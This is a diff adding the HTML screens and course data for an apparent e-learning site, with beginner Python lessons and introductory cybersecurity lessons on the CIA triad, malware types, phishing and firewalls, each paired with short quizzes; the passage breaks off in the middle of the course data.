+        <div class="lpanel on" id="lpanel-vid">
+          <div class="vid-wrap">
+            <iframe id="vid-iframe" src="https://www.youtube.com/embed/rfscVS0vtbw?rel=0" title="Lesson Video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+          </div>
+          <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
+            <span style="font-size:13px; color:var(--muted)" id="vid-source">Source: freeCodeCamp (YouTube)</span>
+            <div style="display:flex; gap:8px;">
+              <a id="yt-external-link" href="https://www.youtube.com/watch?v=rfscVS0vtbw" target="_blank" class="btn btn-ghost btn-sm">▶ Watch on YouTube</a>
+              <button class="btn btn-g btn-sm" onclick="ltab(1)">NEXT: READING NOTES →</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- READING TAB -->
+        <div class="lpanel" id="lpanel-read">
+          <div class="reading" id="reading-content">
+            <!-- Dynamic Reading HTML -->
+          </div>
+          <div style="display:flex; justify-content:flex-end; margin-top:18px;">
+            <button class="btn btn-g btn-sm" onclick="ltab(2)">PROCEED TO QUIZ →</button>
+          </div>
+        </div>
+
+        <!-- QUIZ TAB -->
+        <div class="lpanel" id="lpanel-quiz">
+          <div class="quiz-wrap">
+            <div class="quiz-hd" id="quiz-hd">LESSON KNOWLEDGE CHECK</div>
+            <div class="quiz-sub">Answer the questions below to test your understanding. Pass score is 60%.</div>
+
+            <div id="quiz-questions-container">
+              <!-- Dynamic Quiz Questions -->
+            </div>
+
+            <button class="btn btn-g" style="width:100%; justify-content:center; margin-top:10px;" onclick="submitQuiz()">SUBMIT ANSWERS</button>
+
+            <div class="quiz-result" id="qResult">
+              <div style="font-size:18px; font-weight:700; color:var(--text);">Quiz Results</div>
+              <div class="qr-score" id="qScore">100%</div>
+              <p id="qMsg" style="color:var(--text-sub);">Great job! You passed this lesson quiz.</p>
+              <button class="btn btn-g btn-sm" style="margin-top:16px;" onclick="nextLesson()">CONTINUE TO NEXT LESSON →</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Sidebar -->
+      <div>
+        <div class="ls-list">
+          <div class="ls-list-hd" id="ls-sidebar-title">LESSONS IN THIS COURSE</div>
+          <div id="ls-sidebar-items">
+            <!-- Dynamic Lesson Sidebar -->
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════
+     SCREEN 5: AUTH
+══════════════════════════════════ -->
+<div id="screen-auth" class="screen">
+  <div class="auth-pg">
+    <div class="auth-card">
+      <div class="auth-hd">
+        <div class="auth-logo">Code<span style="color:var(--green)">Sphere</span></div>
+        <p style="font-size:12px; color:var(--muted); margin-top:4px;">Sign in to track progress &amp; earn certificates</p>
+      </div>
+      <div class="auth-body">
+        <div class="fg">
+          <label class="fl">Email Address</label>
+          <input class="fi" type="email" value="user@example.com"/>
+        </div>
+        <div class="fg">
+          <label class="fl">Password</label>
+          <input class="fi" type="password" value="••••••••"/>
+        </div>
+        <button class="btn btn-g" style="width:100%; justify-content:center; margin-top:8px;" onclick="go('dashboard')">SIGN IN</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════
+     SCREEN 6: DASHBOARD
+══════════════════════════════════ -->
+<div id="screen-dashboard" class="screen">
+  <div class="db-layout">
+    <div>
+      <div class="db-user">
+        <div class="db-user-hd">
+          <div class="db-av">M</div>
+          <div>
+            <div class="db-name">Maria Santos</div>
+            <div class="db-email">maria@example.com</div>
+          </div>
+        </div>
+      </div>
+      <div class="db-nav">
+        <button class="db-navlink on">📚 My Enrolled Courses</button>
+        <button class="db-navlink" onclick="go('catalog')">🔍 Browse Catalog</button>
+      </div>
+    </div>
+    <div>
+      <div class="db-hd">Student Dashboard</div>
+      <div class="db-stats">
+        <div class="db-stat"><div class="db-stat-n">6</div><div class="db-stat-l">Enrolled Courses</div></div>
+        <div class="db-stat"><div class="db-stat-n">25</div><div class="db-stat-l">Completed Lessons</div></div>
+        <div class="db-stat"><div class="db-stat-n">95%</div><div class="db-stat-l">Average Quiz Score</div></div>
+      </div>
+      
+      <h3 style="font-size:16px; margin-bottom:14px;">Continue Learning</h3>
+      <div class="enrolled-list">
+        <div class="enr" onclick="loadCourse(0); go('lesson');">
+          <span style="font-size:28px;">🐍</span>
+          <div>
+            <div class="enr-title">Python Programming — Beginners</div>
+            <div class="enr-sub">Module 1 · Lesson 1.1 Complete</div>
+          </div>
+          <button class="btn btn-g btn-sm" style="margin-left:auto;">RESUME →</button>
+        </div>
+        <div class="enr" onclick="loadCourse(1); go('lesson');">
+          <span style="font-size:28px;">🔐</span>
+          <div>
+            <div class="enr-title">Cybersecurity Essentials</div>
+            <div class="enr-sub">Module 1 · Intro to Security</div>
+          </div>
+          <button class="btn btn-g btn-sm" style="margin-left:auto;">RESUME →</button>
+        </div>
+        <div class="enr" onclick="loadCourse(2); go('lesson');">
+          <span style="font-size:28px;">🌐</span>
+          <div>
+            <div class="enr-title">Cisco CCNA — Networking Basics</div>
+            <div class="enr-sub">Module 1 · Network Topologies</div>
+          </div>
+          <button class="btn btn-g btn-sm" style="margin-left:auto;">RESUME →</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div>
+
+<script>
+/* ════════════════════════════════════════
+   FULL ONLINE CURRICULUM DATA & LESSONS
+════════════════════════════════════════ */
+const COURSES = [
+  {
+    "id": 0,
+    "cat": "PYTHON",
+    "title": "Python for Beginners \u2014 Full Course",
+    "desc": "Master Python programming from zero. Covers variables, control flow, functions, lists, dictionaries, and file I/O.",
+    "vid": "rfscVS0vtbw",
+    "level": "BEGINNER",
+    "bdg": "bdg-g",
+    "lessonsCount": 11,
+    "hrs": "8h",
+    "source": "freeCodeCamp (YouTube)",
+    "rating": "\u2b50 4.9 (2,400 reviews)",
+    "outcomes": [
+      "Write clean Python code for automation and scripts",
+      "Understand variables, data types, lists, and dictionaries",
+      "Use loops and conditional statements effectively",
+      "Build real-world projects and handle errors cleanly"
+    ],
+    "lessons": [
+      {
+        "id": 0,
+        "title": "1.1 Introduction to Python",
+        "vid": "kqtD5dpn9C8",
+        "reading": "<h3>What is Python?</h3>\n<p>Python is a popular programming language. It was created by Guido van Rossum, and released in 1991.</p>\n<p>It is used for:</p>\n<ul>\n  <li>web development (server-side),</li>\n  <li>software development,</li>\n  <li>mathematics,</li>\n  <li>system scripting.</li>\n</ul>\n<h3>What can Python do?</h3>\n<ul>\n  <li>Python can be used on a server to create web applications.</li>\n  <li>Python can be used alongside software to create workflows.</li>\n  <li>Python can connect to database systems. It can also read and modify files.</li>\n  <li>Python can be used to handle big data and perform complex mathematics.</li>\n</ul>\n<h3>Python Syntax compared to other programming languages</h3>\n<p>Python was designed for readability, and has some similarities to the English language with influence from mathematics.</p>\n<p>Python uses new lines to complete a command, as opposed to other programming languages which often use semicolons or parentheses.</p>\n<div class='note-box'>\ud83d\udca1 Note: Python relies on indentation, using whitespace, to define scope; such as the scope of loops, functions and classes. Other programming languages often use curly-brackets for this purpose.</div>\n<h3>Example</h3>\n<div class='code-block'>\nprint(\"Hello, World!\")\n</div>",
+        "quiz": [
+          {
+            "q": "What is the correct syntax to output 'Hello World' in Python?",
+            "opts": [
+              "print('Hello World')",
+              "echo('Hello World')",
+              "p('Hello World')"
+            ],
+            "ans": 0
+          }
+        ]
+      },
+      {
+        "id": 1,
+        "title": "1.2 Python Variables and Data Types",
+        "vid": "cKxRvEZd3Kg",
+        "reading": "<h3>Variables</h3>\n<p>Variables are containers for storing data values.</p>\n<p>Unlike other programming languages, Python has no command for declaring a variable.</p>\n<p>A variable is created the moment you first assign a value to it.</p>\n<h3>Example</h3>\n<div class='code-block'>\nx = 5<br>\ny = \"John\"<br>\nprint(x)<br>\nprint(y)\n</div>\n<h3>Casting</h3>\n<p>If you want to specify the data type of a variable, this can be done with casting.</p>\n<div class='code-block'>\nx = str(3)    # x will be '3'<br>\ny = int(3)    # y will be 3<br>\nz = float(3)  # z will be 3.0\n</div>\n<h3>Built-in Data Types</h3>\n<p>In programming, data type is an important concept.</p>\n<p>Variables can store data of different types, and different types can do different things.</p>\n<p>Python has the following data types built-in by default, in these categories:</p>\n<ul>\n  <li>Text Type: <code>str</code></li>\n  <li>Numeric Types: <code>int</code>, <code>float</code>, <code>complex</code></li>\n  <li>Sequence Types: <code>list</code>, <code>tuple</code>, <code>range</code></li>\n  <li>Mapping Type: <code>dict</code></li>\n  <li>Boolean Type: <code>bool</code></li>\n</ul>\n<div class='note-box'>\ud83d\udca1 Note: You can get the data type of any object by using the <code>type()</code> function.</div>",
+        "quiz": [
+          {
+            "q": "How do you create a variable with the numeric value 5?",
+            "opts": [
+              "x = int(5)",
+              "x = 5",
+              "Both are correct"
+            ],
+            "ans": 2
+          }
+        ]
+      },
+      {
+        "id": 2,
+        "title": "1.3 Python Operators",
+        "vid": "v5MR5JnKcZI",
+        "reading": "<h3>Python Operators</h3>\n<p>Operators are used to perform operations on variables and values.</p>\n<p>Python divides the operators in the following groups:</p>\n<ul>\n  <li>Arithmetic operators</li>\n  <li>Assignment operators</li>\n  <li>Comparison operators</li>\n  <li>Logical operators</li>\n  <li>Identity operators</li>\n  <li>Membership operators</li>\n  <li>Bitwise operators</li>\n</ul>\n<h3>Arithmetic Operators</h3>\n<p>Arithmetic operators are used with numeric values to perform common mathematical operations:</p>\n<ul>\n  <li><code>+</code> Addition: <code>x + y</code></li>\n  <li><code>-</code> Subtraction: <code>x - y</code></li>\n  <li><code>*</code> Multiplication: <code>x * y</code></li>\n  <li><code>/</code> Division: <code>x / y</code></li>\n  <li><code>%</code> Modulus: <code>x % y</code></li>\n</ul>\n<h3>Example</h3>\n<div class='code-block'>\nx = 10<br>\ny = 3<br>\nprint(x + y) # Outputs 13\n</div>\n<div class='note-box'>\ud83d\udca1 Note: Python uses two asterisks <code>**</code> for exponentiation. E.g., <code>2 ** 3</code> is 8.</div>",
+        "quiz": [
+          {
+            "q": "Which operator is used to multiply numbers?",
+            "opts": [
+              "*",
+              "x",
+              "#"
+            ],
+            "ans": 0
+          }
+        ]
+      },
+      {
+        "id": 3,
+        "title": "2.1 Python Lists",
+        "vid": "ohCDWZgNIU0",
+        "reading": "<h3>Python Lists</h3>\n<p>Lists are used to store multiple items in a single variable.</p>\n<p>Lists are one of 4 built-in data types in Python used to store collections of data, the other 3 are Tuple, Set, and Dictionary, all with different qualities and usage.</p>\n<p>Lists are created using square brackets:</p>\n<h3>Example</h3>\n<div class='code-block'>\nthislist = [\"apple\", \"banana\", \"cherry\"]<br>\nprint(thislist)\n</div>\n<h3>List Items</h3>\n<p>List items are ordered, changeable, and allow duplicate values.</p>\n<p>List items are indexed, the first item has index <code>[0]</code>, the second item has index <code>[1]</code> etc.</p>\n<h3>Access Items</h3>\n<p>You access the list items by referring to the index number:</p>\n<div class='code-block'>\nthislist = [\"apple\", \"banana\", \"cherry\"]<br>\nprint(thislist[1]) # Outputs banana\n</div>\n<div class='note-box'>\ud83d\udca1 Note: Negative indexing means start from the end. <code>-1</code> refers to the last item, <code>-2</code> refers to the second last item etc.</div>",
+        "quiz": [
+          {
+            "q": "Which collection is ordered, changeable, and allows duplicate members?",
+            "opts": [
+              "Set",
+              "Dictionary",
+              "List"
+            ],
+            "ans": 2
+          }
+        ]
+      },
+      {
+        "id": 4,
+        "title": "2.2 Python Dictionaries",
+        "vid": "daefaLgNkw0",
+        "reading": "<h3>Python Dictionaries</h3>\n<p>Dictionaries are used to store data values in key:value pairs.</p>\n<p>A dictionary is a collection which is ordered*, changeable and does not allow duplicates.</p>\n<p>Dictionaries are written with curly brackets, and have keys and values:</p>\n<h3>Example</h3>\n<div class='code-block'>\nthisdict = {<br>\n  \"brand\": \"Ford\",<br>\n  \"model\": \"Mustang\",<br>\n  \"year\": 1964<br>\n}<br>\nprint(thisdict)\n</div>\n<h3>Dictionary Items</h3>\n<p>Dictionary items are ordered, changeable, and does not allow duplicates.</p>\n<p>Dictionary items are presented in key:value pairs, and can be referred to by using the key name.</p>\n<h3>Accessing Items</h3>\n<p>You can access the items of a dictionary by referring to its key name, inside square brackets:</p>\n<div class='code-block'>\nx = thisdict[\"model\"]\n</div>\n<div class='note-box'>\ud83d\udca1 Note: As of Python version 3.7, dictionaries are ordered. In Python 3.6 and earlier, dictionaries are unordered.</div>",
+        "quiz": [
+          {
+            "q": "Dictionaries are written with...",
+            "opts": [
+              "Square brackets []",
+              "Curly brackets {}",
+              "Parentheses ()"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 5,
+        "title": "3.1 Python If...Else",
+        "vid": "f4KOjWS_KFs",
+        "reading": "<h3>Python Conditions and If statements</h3>\n<p>Python supports the usual logical conditions from mathematics:</p>\n<ul>\n  <li>Equals: <code>a == b</code></li>\n  <li>Not Equals: <code>a != b</code></li>\n  <li>Less than: <code>a &lt; b</code></li>\n  <li>Less than or equal to: <code>a &lt;= b</code></li>\n  <li>Greater than: <code>a &gt; b</code></li>\n  <li>Greater than or equal to: <code>a &gt;= b</code></li>\n</ul>\n<p>These conditions can be used in several ways, most commonly in \"if statements\" and loops.</p>\n<p>An \"if statement\" is written by using the <code>if</code> keyword.</p>\n<h3>Example</h3>\n<div class='code-block'>\na = 33<br>\nb = 200<br>\nif b &gt; a:<br>\n&nbsp;&nbsp;print(\"b is greater than a\")\n</div>\n<h3>Indentation</h3>\n<p>Python relies on indentation (whitespace at the beginning of a line) to define scope in the code. Other programming languages often use curly-brackets for this purpose.</p>\n<h3>Elif and Else</h3>\n<p>The <code>elif</code> keyword is Python's way of saying \"if the previous conditions were not true, then try this condition\".</p>\n<p>The <code>else</code> keyword catches anything which isn't caught by the preceding conditions.</p>\n<div class='note-box'>\ud83d\udca1 Note: You can have multiple <code>elif</code> statements, but only one <code>else</code> at the end.</div>",
+        "quiz": [
+          {
+            "q": "How do you write an if statement in Python?",
+            "opts": [
+              "if x > y:",
+              "if (x > y)",
+              "if x > y then:"
+            ],
+            "ans": 0
+          }
+        ]
+      },
+      {
+        "id": 6,
+        "title": "3.2 Python While Loops",
+        "vid": "jPsZwrV9IQQ",
+        "reading": "<h3>Python Loops</h3>\n<p>Python has two primitive loop commands:</p>\n<ul>\n  <li><code>while</code> loops</li>\n  <li><code>for</code> loops</li>\n</ul>\n<h3>The while Loop</h3>\n<p>With the <code>while</code> loop we can execute a set of statements as long as a condition is true.</p>\n<h3>Example</h3>\n<p>Print <code>i</code> as long as <code>i</code> is less than 6:</p>\n<div class='code-block'>\ni = 1<br>\nwhile i &lt; 6:<br>\n&nbsp;&nbsp;print(i)<br>\n&nbsp;&nbsp;i += 1\n</div>\n<h3>The break Statement</h3>\n<p>With the <code>break</code> statement we can stop the loop even if the while condition is true:</p>\n<div class='code-block'>\ni = 1<br>\nwhile i &lt; 6:<br>\n&nbsp;&nbsp;print(i)<br>\n&nbsp;&nbsp;if i == 3:<br>\n&nbsp;&nbsp;&nbsp;&nbsp;break<br>\n&nbsp;&nbsp;i += 1\n</div>\n<h3>The continue Statement</h3>\n<p>With the <code>continue</code> statement we can stop the current iteration, and continue with the next:</p>\n<div class='note-box'>\ud83d\udca1 Note: Remember to increment <code>i</code>, or else the loop will continue forever (infinite loop).</div>",
+        "quiz": [
+          {
+            "q": "Which statement is used to stop a loop?",
+            "opts": [
+              "stop",
+              "break",
+              "exit"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 7,
+        "title": "3.3 Python For Loops",
+        "vid": "OnDr4J2UXSA",
+        "reading": "<h3>Python For Loops</h3>\n<p>A <code>for</code> loop is used for iterating over a sequence (that is either a list, a tuple, a dictionary, a set, or a string).</p>\n<p>This is less like the for keyword in other programming languages, and works more like an iterator method as found in other object-orientated programming languages.</p>\n<p>With the <code>for</code> loop we can execute a set of statements, once for each item in a list, tuple, set etc.</p>\n<h3>Example</h3>\n<p>Print each fruit in a fruit list:</p>\n<div class='code-block'>\nfruits = [\"apple\", \"banana\", \"cherry\"]<br>\nfor x in fruits:<br>\n&nbsp;&nbsp;print(x)\n</div>\n<h3>Looping Through a String</h3>\n<p>Even strings are iterable objects, they contain a sequence of characters:</p>\n<div class='code-block'>\nfor x in \"banana\":<br>\n&nbsp;&nbsp;print(x)\n</div>\n<h3>The range() Function</h3>\n<p>To loop through a set of code a specified number of times, we can use the <code>range()</code> function.</p>\n<p>The <code>range()</code> function returns a sequence of numbers, starting from 0 by default, and increments by 1 (by default), and ends at a specified number.</p>\n<div class='note-box'>\ud83d\udca1 Note: <code>range(6)</code> is not the values of 0 to 6, but the values 0 to 5.</div>",
+        "quiz": [
+          {
+            "q": "Which function allows you to loop a specific number of times?",
+            "opts": [
+              "loop()",
+              "iterate()",
+              "range()"
+            ],
+            "ans": 2
+          }
+        ]
+      },
+      {
+        "id": 8,
+        "title": "4.1 Python Functions",
+        "vid": "9Os0o3wzS_I",
+        "reading": "<h3>Python Functions</h3>\n<p>A function is a block of code which only runs when it is called.</p>\n<p>You can pass data, known as parameters, into a function.</p>\n<p>A function can return data as a result.</p>\n<h3>Creating a Function</h3>\n<p>In Python a function is defined using the <code>def</code> keyword:</p>\n<div class='code-block'>\ndef my_function():<br>\n&nbsp;&nbsp;print(\"Hello from a function\")\n</div>\n<h3>Calling a Function</h3>\n<p>To call a function, use the function name followed by parenthesis:</p>\n<div class='code-block'>\ndef my_function():<br>\n&nbsp;&nbsp;print(\"Hello from a function\")<br>\n<br>\nmy_function()\n</div>\n<h3>Arguments</h3>\n<p>Information can be passed into functions as arguments.</p>\n<p>Arguments are specified after the function name, inside the parentheses. You can add as many arguments as you want, just separate them with a comma.</p>\n<h3>Return Values</h3>\n<p>To let a function return a value, use the <code>return</code> statement.</p>\n<div class='note-box'>\ud83d\udca1 Note: Arguments are often shortened to args in Python documentations.</div>",
+        "quiz": [
+          {
+            "q": "How do you define a function in Python?",
+            "opts": [
+              "function myFunc():",
+              "def myFunc():",
+              "create myFunc():"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 9,
+        "title": "5.1 Classes and Objects",
+        "vid": "JeznW_7DlB0",
+        "reading": "<h3>Python Classes/Objects</h3>\n<p>Python is an object oriented programming language.</p>\n<p>Almost everything in Python is an object, with its properties and methods.</p>\n<p>A Class is like an object constructor, or a \"blueprint\" for creating objects.</p>\n<h3>Create a Class</h3>\n<p>To create a class, use the keyword <code>class</code>:</p>\n<div class='code-block'>\nclass MyClass:<br>\n&nbsp;&nbsp;x = 5\n</div>\n<h3>Create Object</h3>\n<p>Now we can use the class named MyClass to create objects:</p>\n<div class='code-block'>\np1 = MyClass()<br>\nprint(p1.x)\n</div>\n<h3>The __init__() Function</h3>\n<p>The examples above are classes and objects in their simplest form, and are not really useful in real life applications.</p>\n<p>To understand the meaning of classes we have to understand the built-in <code>__init__()</code> function.</p>\n<p>All classes have a function called <code>__init__()</code>, which is always executed when the class is being initiated.</p>\n<div class='note-box'>\ud83d\udca1 Note: The <code>self</code> parameter is a reference to the current instance of the class, and is used to access variables that belong to the class.</div>",
+        "quiz": [
+          {
+            "q": "Which method is automatically executed when an object is created?",
+            "opts": [
+              "__init__",
+              "__main__",
+              "__start__"
+            ],
+            "ans": 0
+          }
+        ]
+      },
+      {
+        "id": 10,
+        "title": "5.2 Python Inheritance",
+        "vid": "RSl87lqOXDE",
+        "reading": "<h3>Python Inheritance</h3>\n<p>Inheritance allows us to define a class that inherits all the methods and properties from another class.</p>\n<p><strong>Parent class</strong> is the class being inherited from, also called base class.</p>\n<p><strong>Child class</strong> is the class that inherits from another class, also called derived class.</p>\n<h3>Create a Parent Class</h3>\n<p>Any class can be a parent class, so the syntax is the same as creating any other class:</p>\n<div class='code-block'>\nclass Person:<br>\n&nbsp;&nbsp;def __init__(self, fname, lname):<br>\n&nbsp;&nbsp;&nbsp;&nbsp;self.firstname = fname<br>\n&nbsp;&nbsp;&nbsp;&nbsp;self.lastname = lname<br>\n<br>\n&nbsp;&nbsp;def printname(self):<br>\n&nbsp;&nbsp;&nbsp;&nbsp;print(self.firstname, self.lastname)<br>\n<br>\n#Use the Person class to create an object, and then execute the printname method:<br>\nx = Person(\"John\", \"Doe\")<br>\nx.printname()\n</div>\n<h3>Create a Child Class</h3>\n<p>To create a class that inherits the functionality from another class, send the parent class as a parameter when creating the child class:</p>\n<div class='code-block'>\nclass Student(Person):<br>\n&nbsp;&nbsp;pass\n</div>\n<div class='note-box'>\ud83d\udca1 Note: Use the <code>pass</code> keyword when you do not want to add any other properties or methods to the class.</div>",
+        "quiz": [
+          {
+            "q": "How do you create a class named Student that inherits from Person?",
+            "opts": [
+              "class Student(Person):",
+              "class Student inherits Person:",
+              "class Student.Person:"
+            ],
+            "ans": 0
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": 1,
+    "cat": "CYBERSECURITY",
+    "title": "Cybersecurity Essentials",
+    "desc": "Understand network security, attack vectors, cryptography, firewalls, and defense strategies.",
+    "vid": "inWWhr5tnEA",
+    "level": "BEGINNER",
+    "bdg": "bdg-g",
+    "lessonsCount": 13,
+    "hrs": "6h",
+    "source": "NetworkChuck (YouTube)",
+    "rating": "\u2b50 4.8 (1,800 reviews)",
+    "outcomes": [
+      "Understand CIA Triad (Confidentiality, Integrity, Availability)",
+      "Analyze network attack vectors and phishing tactics",
+      "Understand firewalls, VPNs, and modern security protocols"
+    ],
+    "lessons": [
+      {
+        "id": 0,
+        "title": "1.1 Introduction to Cybersecurity",
+        "vid": "inWWhr5tnEA",
+        "reading": "<h3>What is Cybersecurity?</h3>\n<p>Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. These cyberattacks are usually aimed at accessing, changing, or destroying sensitive information; extorting money from users; or interrupting normal business processes.</p>\n<p>Implementing effective cybersecurity measures is particularly challenging today because there are more devices than people, and attackers are becoming more innovative.</p>\n<div class='note-box'>\ud83d\udca1 Note: Cybersecurity involves not only technology but also people and processes working together.</div>\n<h3>Why is Cybersecurity Important?</h3>\n<p>With an increasing number of users, devices, and programs in the modern enterprise, combined with the growing deluge of data \u2014 much of which is sensitive or confidential \u2014 the importance of cybersecurity continues to grow.</p>\n<ul>\n    <li><b>Protection of Data:</b> Safeguarding intellectual property, financial data, and personal information.</li>\n    <li><b>Business Continuity:</b> Ensuring systems remain operational despite potential attacks.</li>\n    <li><b>Trust:</b> Maintaining the trust of customers and stakeholders.</li>\n</ul>\n<div class='code-block'>\n# Example of a simple script to check system security status\ndef check_security_status():\n    print(\"Checking firewall...\")\n    return True\n</div>",
+        "quiz": [
+          {
+            "q": "What is the primary goal of cybersecurity?",
+            "opts": [
+              "To increase network speed",
+              "To protect systems, networks, and programs from digital attacks",
+              "To fix broken hardware"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 1,
+        "title": "1.2 The CIA Triad",
+        "vid": "V9H7mH3gI1s",
+        "reading": "<h3>The Core Concept of Security</h3>\n<p>The CIA triad is a well-known model for security policy development, used to identify problem areas and necessary solutions for information security. CIA stands for <b>Confidentiality, Integrity, and Availability</b>.</p>\n<ul>\n    <li><b>Confidentiality:</b> Ensuring that information is accessible only to those authorized to have access.</li>\n    <li><b>Integrity:</b> Safeguarding the accuracy and completeness of information and processing methods.</li>\n    <li><b>Availability:</b> Ensuring that authorized users have access to information and associated assets when required.</li>\n</ul>\n<div class='note-box'>\ud83d\udca1 Note: Think of the CIA triad as the three pillars that hold up any information security strategy.</div>\n<h3>How the Triad is Applied</h3>\n<p>When designing a system, all three components must be balanced. For example, making a system highly confidential might make it less available. Security professionals must weigh the risks and requirements of the organization to find the right balance.</p>",
+        "quiz": [
+          {
+            "q": "What does the 'I' in the CIA triad stand for?",
+            "opts": [
+              "Information",
+              "Integrity",
+              "Intelligence"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 2,
+        "title": "2.1 Common Cyber Threats",
+        "vid": "7e9w_97t2eA",
+        "reading": "<h3>Understanding the Threat Landscape</h3>\n<p>A cyber threat is any malicious act that attempts to gain access to a computer network without authorization or permission. Threats can come from various sources, including hostile nation-states, terrorist groups, corporate spies, and lone hackers.</p>\n<h3>Types of Cyber Threats</h3>\n<ul>\n    <li><b>Cybercrime:</b> Single actors or groups targeting systems for financial gain or to cause disruption.</li>\n    <li><b>Cyberattack:</b> Often involves politically motivated information gathering.</li>\n    <li><b>Cyberterrorism:</b> Intended to undermine electronic systems to cause panic or fear.</li>\n</ul>\n<div class='note-box'>\ud83d\udca1 Note: A threat is not the same as a vulnerability. A vulnerability is a weakness, while a threat is the potential to exploit that weakness.</div>\n<p>To defend against these threats, organizations must implement robust security controls, continuous monitoring, and effective incident response plans.</p>",
+        "quiz": [
+          {
+            "q": "Which of the following is defined as a weakness in a system?",
+            "opts": [
+              "Threat",
+              "Vulnerability",
+              "Exploit"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 3,
+        "title": "2.2 Malware & Viruses",
+        "vid": "vTAHq-nK6J0",
+        "reading": "<h3>What is Malware?</h3>\n<p>Malware, short for malicious software, is an umbrella term for any software intentionally designed to cause disruption to a computer, server, client, or computer network, leak private information, gain unauthorized access to information or systems, deprive users of access to information, or which unknowingly interferes with the user's computer security and privacy.</p>\n<h3>Common Types of Malware</h3>\n<ul>\n    <li><b>Viruses:</b> Programs that can replicate themselves and infect other files.</li>\n    <li><b>Worms:</b> Similar to viruses, but they can spread across networks without human intervention.</li>\n    <li><b>Trojans:</b> Malicious software disguised as legitimate software.</li>\n    <li><b>Ransomware:</b> Malware that encrypts a victim's files and demands payment to restore access.</li>\n</ul>\n<div class='code-block'>\n# Concept of a basic virus signature detection\ndef detect_virus(file_data, signature):\n    if signature in file_data:\n        return \"Malware detected!\"\n    return \"File is clean.\"\n</div>\n<div class='note-box'>\ud83d\udca1 Note: Always keep your antivirus software up-to-date to protect against the latest malware variants.</div>",
+        "quiz": [
+          {
+            "q": "Which type of malware disguises itself as legitimate software?",
+            "opts": [
+              "Worm",
+              "Trojan",
+              "Ransomware"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 4,
+        "title": "2.3 Phishing & Social Engineering",
+        "vid": "LCsR2s9I8H8",
+        "reading": "<h3>The Human Element of Security</h3>\n<p>Social engineering is the psychological manipulation of people into performing actions or divulging confidential information. It exploits human psychology rather than technical vulnerabilities.</p>\n<h3>Phishing: The Most Common Form</h3>\n<p>Phishing is a specific type of social engineering attack often used to steal user data, including login credentials and credit card numbers. It occurs when an attacker, masquerading as a trusted entity, dupes a victim into opening an email, instant message, or text message.</p>\n<ul>\n    <li><b>Spear Phishing:</b> Targeted phishing aimed at a specific individual or organization.</li>\n    <li><b>Whaling:</b> Phishing targeting high-profile targets like C-level executives.</li>\n    <li><b>Vishing:</b> Voice phishing, typically done over the phone.</li>\n</ul>\n<div class='note-box'>\ud83d\udca1 Note: Always verify the sender's email address and avoid clicking on suspicious links.</div>\n<p>Organizations combat phishing through employee training, email filtering, and implementing multi-factor authentication (MFA).</p>",
+        "quiz": [
+          {
+            "q": "What is phishing targeting a specific individual called?",
+            "opts": [
+              "Spear Phishing",
+              "Whaling",
+              "Vishing"
+            ],
+            "ans": 0
+          }
+        ]
+      },
+      {
+        "id": 5,
+        "title": "3.1 Network Security Basics",
+        "vid": "3Kq1MIfTWCE",
+        "reading": "<h3>Securing the Network</h3>\n<p>Network security is any activity designed to protect the usability and integrity of your network and data. It includes both hardware and software technologies. Effective network security manages access to the network.</p>\n<h3>Key Components of Network Security</h3>\n<ul>\n    <li><b>Access Control:</b> Not every user should have access to your network. To keep out potential attackers, you need to recognize each user and each device.</li>\n    <li><b>Application Security:</b> Any software you use to run your business needs to be protected, whether your IT staff builds it or whether you buy it.</li>\n    <li><b>Behavioral Analytics:</b> To detect abnormal network behavior, you must know what normal behavior looks like.</li>\n</ul>\n<div class='note-box'>\ud83d\udca1 Note: A defense-in-depth strategy is crucial, meaning multiple layers of security are applied.</div>\n<p>By securing the network, organizations can prevent data breaches, reduce risk, and ensure that their systems are highly available for legitimate users.</p>",
+        "quiz": [
+          {
+            "q": "What is the strategy of using multiple layers of security called?",
+            "opts": [
+              "Defense-in-depth",
+              "Single-point security",
+              "Overhead security"
+            ],
+            "ans": 0
+          }
+        ]
+      },
+      {
+        "id": 6,
+        "title": "3.2 Firewalls and VPNs",
+        "vid": "7_LPdttKXPc",
+        "reading": "<h3>Building Barriers</h3>\n<p>A firewall is a network security device that monitors incoming and outgoing network traffic and decides whether to allow or block specific traffic based on a defined set of security rules. Firewalls have been a first line of defense in network security for over 25 years.</p>\n<h3>Virtual Private Networks (VPNs)</h3>\n<p>A virtual private network (VPN) gives you online privacy and anonymity by creating a private network from a public internet connection. VPNs mask your internet protocol (IP) address so your online actions are virtually untraceable.</p>\n<ul>\n    <li><b>Firewalls:</b> Act as a barrier between your internal network and the outside world.</li>\n    <li><b>VPNs:</b> Encrypt your data in transit, ensuring that even if intercepted, it cannot be read.</li>\n</ul>\n<div class='code-block'>\n# Pseudo-rule for a firewall\nALLOW TCP from ANY to 192.168.1.10 on PORT 80\nDENY ALL from ANY to ANY\n</div>\n<div class='note-box'>\ud83d\udca1 Note: Using a VPN is especially important when connecting to public Wi-Fi networks.</div>",
+        "quiz": [
+          {
+            "q": "What is the primary function of a VPN?",
+            "opts": [
+              "To block all incoming traffic",
+              "To encrypt data in transit and mask your IP address",
+              "To detect malware on your computer"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 7,
+        "title": "4.1 Introduction to Cryptography",
+        "vid": "jhXCTbFnK8o",
